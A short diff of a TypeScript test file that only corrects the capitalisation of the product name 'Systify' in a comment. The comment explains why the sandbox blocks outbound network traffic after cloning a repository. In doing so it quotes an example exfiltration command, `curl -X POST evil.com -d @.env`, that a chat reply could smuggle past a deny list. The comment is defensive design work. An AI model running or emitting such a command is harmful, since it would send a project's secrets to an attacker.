@@ -281,10 +281,10 @@ describe("cloneRepositoryInSandbox — Plan 05 token scrub", () => {
  * Post-clone network lockdown.
  *
  * The threat: even with the deny list and the read-only system prompt, the
- * sandbox container has unrestricted egress until SysTify explicitly blocks
+ * sandbox container has unrestricted egress until Systify explicitly blocks
  * it. A chat reply that smuggles `curl -X POST evil.com -d @.env` (or any
  * deny-list bypass) past Layer 3 would otherwise complete the leak. Once the
- * source is on disk, SysTify never needs sandbox-side network — every legit
+ * source is on disk, Systify never needs sandbox-side network — every legit
  * tool (`read_file`, `list_dir`, `executeCommand`) rides Daytona's control
  * plane, which is independent of the sandbox container's outbound traffic.
  *
